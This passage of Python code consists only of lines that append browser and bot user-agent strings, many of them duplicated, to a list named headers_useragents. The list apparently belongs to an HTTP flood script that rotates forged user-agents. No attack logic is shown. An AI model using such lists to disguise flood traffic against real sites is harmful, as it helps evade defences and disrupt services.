                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
